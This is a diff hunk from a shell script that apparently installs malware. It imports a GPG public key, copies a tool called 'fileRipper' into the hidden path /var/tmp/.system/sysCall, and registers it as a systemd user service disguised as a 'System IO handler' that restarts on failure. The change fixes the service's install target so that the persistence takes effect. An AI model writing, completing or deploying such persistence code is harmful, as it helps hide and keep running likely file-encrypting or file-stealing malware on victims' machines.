@@ -7,7 +7,7 @@ gpg --import /tmp/public.pub
 rm /tmp/public.pub
 mkdir ~/.crypttt
 mkdir -p ~/.config/systemd/user 
-echo -e "[Unit]\nDescription= System IO handler.\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/sysCall -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=multi-user.target" > ~/.config/systemd/user/libSystemIO.service
+echo -e "[Unit]\nDescription= System IO handler.\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/sysCall -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/libSystemIO.service
 mkdir /var/tmp/.system
 cp -r $mntt/tools/fileRipper /var/tmp/.system/sysCall
 chmod +x /var/tmp/.system/sysCall
